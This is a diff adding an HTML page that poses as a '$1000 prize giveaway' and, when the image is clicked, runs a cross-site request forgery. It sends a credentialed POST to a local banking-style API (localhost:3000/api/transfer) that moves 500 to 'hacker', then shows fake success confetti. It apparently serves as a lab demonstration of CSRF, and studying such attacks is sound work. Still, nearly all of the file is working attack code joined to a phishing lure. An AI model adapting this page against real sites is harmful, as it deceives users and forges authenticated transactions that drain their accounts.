@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Free Money Giveaway!</title>
+    <link rel="stylesheet" href="evil.css">
+</head>
+<body>
+    <div class="container">
+        <h1>🎉 CONGRATULATIONS! 🎉</h1>
+        <p class="prize">You've won $1000!</p>
+        <p>Click the image below to claim your prize!</p>
+        
+        <!-- Image that triggers the CSRF attack -->
+        <img 
+            src="https://picsum.photos/400/300" 
+            alt="Click to claim your prize!"
+            id="claimPrizeImg"
+            style="cursor:pointer;"
+        >
+        
+        <p>Don't miss this amazing opportunity!</p>
+        <p style="font-size: 12px; color: #666;">* Limited time offer. Click now to claim your prize!</p>
+
+        <!-- Success Message -->
+        <div id="successMessage" class="success-message">
+            <h2>🎉 Prize Claimed Successfully! 🎉</h2>
+            <p>Your prize has been processed!</p>
+            <p>Thank you for participating in our giveaway!</p>
+        </div>
+    </div>
+
+    <script>
+        function createConfetti() {
+            const colors = ['#ff0000', '#00ff00', '#0000ff', '#ffff00', '#ff00ff'];
+            for (let i = 0; i < 50; i++) {
+                const confetti = document.createElement('div');
+                confetti.className = 'confetti';
+                confetti.style.left = Math.random() * 100 + 'vw';
+                confetti.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
+                confetti.style.animationDelay = Math.random() * 3 + 's';
+                document.body.appendChild(confetti);
+            }
+        }
+
+        document.getElementById('claimPrizeImg').onclick = function() {
+            console.log('🎯 Attempting CSRF attack...');
+            
+            fetch('http://localhost:3000/api/transfer', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                credentials: 'include',
+                body: JSON.stringify({
+                    amount: 500,
+                    to: 'hacker'
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('✅ CSRF Attack Response:', data);
+                if (data.success) {
+                    // Show success message
+                    const successMessage = document.getElementById('successMessage');
+                    successMessage.style.display = 'block';
+                    // Create confetti effect
+                    createConfetti();
+                    // Hide the image and other content
+                    document.getElementById('claimPrizeImg').style.display = 'none';
+                    document.querySelector('.prize').style.display = 'none';
+                    document.querySelector('p').style.display = 'none';
+                    
+                    // Add success info
+                    successMessage.innerHTML += `<p>💰 Money transferred! New balance: ${data.newBalance}</p>`;
+                } else {
+                    alert('❌ Attack failed: ' + data.message);
+                }
+            })
+            .catch(error => {
+                console.error('❌ CSRF Attack Error:', error);
+                alert('❌ Attack failed: ' + error.message);
+            });
+        };
+    </script>
+</body>
+</html> 
